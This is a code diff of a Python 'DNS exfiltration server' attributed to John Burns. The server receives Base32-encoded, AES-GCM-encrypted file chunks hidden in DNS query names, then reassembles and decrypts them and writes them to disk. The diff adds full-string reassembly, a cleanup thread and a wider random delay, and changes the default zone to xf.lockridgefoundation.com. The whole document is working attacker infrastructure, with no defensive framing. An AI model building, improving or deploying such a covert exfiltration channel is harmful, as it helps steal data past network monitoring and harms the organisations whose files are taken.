@@ -3,52 +3,51 @@
 Module Name: server.py
 
 Description: DNS exfiltration server that receives Base32-encoded, AES-GCM encrypted data chunks in DNS queries,
-reassembles and decrypts the original file, and writes it to disk.
+reassembles the full Base32 string, decodes and decrypts the blob, then writes the plaintext to disk.
 
 Author: John Burns
 Date: 2024-04-30
-Version: 1.2 (AES-GCM decryption)
+Version: 1.4 (Full Base32 reassembly)
 """
-from dotenv import load_dotenv, find_dotenv
+
+import os
 import threading
 import struct
 import socket
 import base64
 from collections import defaultdict
-import os
-import random
 import argparse
-import time
 import logging
+import time
+import random
 from dnslib import DNSRecord, RR, QTYPE, A
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+from dotenv import load_dotenv, find_dotenv
 load_dotenv(find_dotenv())
-# Configure logging
-tlogging = logging.getLogger('main')
+# Logger setup
 logging.basicConfig(level=logging.INFO,
                     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
-logger = tlogging
+logger = logging.getLogger('main')
 
-# Load AES-GCM key (32 bytes hex) from environment
+# AES-GCM key (32 bytes hex) loaded from env
 KEY = bytes.fromhex(os.environ['EXFIL_KEY'])
 
 def decrypt_data(blob: bytes) -> bytes:
     """
-    Decrypts AES-GCM blob: nonce (12B) || ciphertext+tag
-    Returns the original plaintext.
+    Decrypt AES-GCM blob: nonce (12B) || ciphertext+tag
     """
     aesgcm = AESGCM(KEY)
     nonce = blob[:12]
-    ct = blob[12:]
-    return aesgcm.decrypt(nonce, ct, associated_data=None)
+    ct_tag = blob[12:]
+    return aesgcm.decrypt(nonce, ct_tag, associated_data=None)
 
-# Store incoming encrypted fragments by identifier
+# Storage for payload strings per identifier
 data_fragments = defaultdict(dict)
 expected_counts = defaultdict(int)
+last_seen = defaultdict(lambda: time.time())
 
 
 def parse_dns_header(data):
-    # Returns (id, flags)
     return struct.unpack('!6H', data[:12])[:2]
 
 
@@ -71,26 +70,25 @@ def parse_dns_query_section(data):
 
 def handle_dns_request(data, addr, sock, args):
     dns_id, dns_flags = parse_dns_header(data)
-    # Drop responses (QR bit = 1)
+    # Drop responses
     if (dns_flags >> 15) & 1:
         return
 
     raw_qname = parse_dns_query_section(data)
     if not raw_qname:
-        logger.info("DNS query parsing failed.")
+        logger.info("Failed to parse QNAME")
         return
 
     qname_nodot = raw_qname.rstrip('.')
     qname_compare = qname_nodot.lower()
     zone = args.domain.rstrip('.').lower()
     if not qname_compare.endswith('.' + zone):
-        logger.info(f"Invalid domain: {raw_qname}")
+        logger.info(f"Ignoring QNAME: {raw_qname}")
         return
 
     identifier_segment = qname_nodot[:-(len(zone) + 1)]
     # Rate-limit
-    pause_ms = random.randint(args.low, args.high)
-    time.sleep(pause_ms / 1000)
+    time.sleep(random.randint(args.low, args.high) / 1000)
 
     process_query(identifier_segment, args)
     send_dns_response(data, addr, sock)
@@ -98,72 +96,85 @@ def handle_dns_request(data, addr, sock, args):
 
 def send_dns_response(data, addr, sock):
     try:
-        request = DNSRecord.parse(data)
-        reply = request.reply()
-        reply.add_answer(RR(request.q.qname, QTYPE.A, rdata=A("192.0.2.1"), ttl=300))
+        req = DNSRecord.parse(data)
+        reply = req.reply()
+        reply.add_answer(RR(req.q.qname, QTYPE.A, rdata=A("192.0.2.1"), ttl=300))
         sock.sendto(reply.pack(), addr)
     except Exception as e:
-        logger.error(f"Error sending response: {e}")
+        logger.error(f"Response error: {e}")
 
 
 def process_query(identifier_segment, args):
     try:
         ident_raw, idx, total, payload = identifier_segment.split('-', 3)
     except ValueError:
-        logger.info(f"Bad segment: {identifier_segment}")
+        logger.info(f"Malformed segment: {identifier_segment}")
         return
-
     identifier = ident_raw.lower()
-    logger.info(f"[{identifier}] Received chunk {idx}/{total}")
+    idx = int(idx)
+    total = int(total)
+    expected_counts[identifier] = total
 
-    # Base32 padding to multiple of 8
-    pad_len = (8 - (len(payload) % 8)) % 8
-    padded = payload + ('=' * pad_len)
+    logger.info(f"[{identifier}] Chunk {idx+1}/{total}")
+    # Store raw Base32 payload string
+    data_fragments[identifier][idx] = payload
+    received = len(data_fragments[identifier])
+    logger.info(f"[{identifier}] Received {received}/{total} chunks")
+
+    if received == total:
+        assemble_and_save(identifier, data_fragments.pop(identifier), args)
+    # Timeout incompleted segments
+    last_seen[identifier] = time.time()
+
+def cleanup_expired_entries(ttl_seconds=600, interval=60):
+    while True:
+        now = time.time()
+        expired = [key for key, ts in last_seen.items() if now - ts > ttl_seconds]
+        for key in expired:
+            data_fragments.pop(key, None)
+            expected_counts.pop(key, None)
+            last_seen.pop(key, None)
+            logger.info(f"[{key}] Expired and removed from memory due to timeout.")
+        time.sleep(interval)
+
+def assemble_and_save(identifier, fragments, args):
+    # Reassemble Base32 string
+    full_b32 = ''.join(fragments[i] for i in sorted(fragments))
+    # Pad to multiple of 8 for Base32
+    pad_len = (8 - (len(full_b32) % 8)) % 8
+    padded = full_b32 + ('=' * pad_len)
+
     try:
-        encrypted = base64.b32decode(padded, casefold=True)
+        encrypted_blob = base64.b32decode(padded, casefold=True)
     except Exception as e:
-        logger.error(f"[{identifier}] Base32 decode error: {e}")
+        logger.error(f"[{identifier}] Base32 decode failed: {e}")
         return
 
-    index = int(idx)
-    total_segments = int(total)
-    expected_counts[identifier] = total_segments
-    data_fragments[identifier][index] = encrypted
-
-    received = len(data_fragments[identifier])
-    logger.info(f"[{identifier}] Fragments: {received}/{total_segments}")
-    if received == total_segments:
-        save_data(identifier, data_fragments.pop(identifier), args)
-
-
-def save_data(identifier, fragments, args):
-        # Reassemble encrypted blob
-    encrypted_blob = b''.join(fragments[i] for i in sorted(fragments))
-        # Decrypt entire blob
     try:
         plaintext = decrypt_data(encrypted_blob)
     except Exception as e:
-        logger.error(f"[{identifier}] Decrypt failed: {e}")
+        logger.error(f"[{identifier}] AES-GCM decrypt failed: {e}")
         return
 
     os.makedirs(args.output_dir, exist_ok=True)
     out_path = os.path.join(args.output_dir, f"{identifier}.bin")
     with open(out_path, 'wb') as f:
         f.write(plaintext)
-    logger.info(f"[{identifier}] Saved decrypted data to {out_path}")
+    logger.info(f"[{identifier}] File saved: {out_path}")
 
 
 def get_args():
-    parser = argparse.ArgumentParser(description="DNS Exfiltration Server")
-    parser.add_argument("--port", type=int, default=53, help="UDP port to listen on")
-    parser.add_argument("--output-dir", default="output", help="Directory for output files")
-    parser.add_argument("--low", type=int, default=100, help="Min delay (ms)")
-    parser.add_argument("--high", type=int, default=800, help="Max delay (ms)")
-    parser.add_argument("--domain", default="xf.example.com", help="Zone to match")
-    return parser.parse_args()
+    p = argparse.ArgumentParser(description="DNS Exfiltration Server")
+    p.add_argument("--port", type=int, default=53)
+    p.add_argument("--output-dir", default="output")
+    p.add_argument("--low", type=int, default=100)
+    p.add_argument("--high", type=int, default=1500)
+    p.add_argument("--domain", default="xf.lockridgefoundation.com")
+    return p.parse_args()
 
 
 def start_server(args):
+    threading.Thread(target=cleanup_expired_entries, daemon=True).start()
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.bind(("", args.port))
     sock.settimeout(1)
@@ -176,10 +187,11 @@ def start_server(args):
                 continue
             threading.Thread(target=handle_dns_request, args=(data, addr, sock, args), daemon=True).start()
     except KeyboardInterrupt:
-        logger.info("Shutting down.")
+        logger.info("Server stopping.")
     finally:
         sock.close()
 
 if __name__ == "__main__":
     args = get_args()
     start_server(args)
+
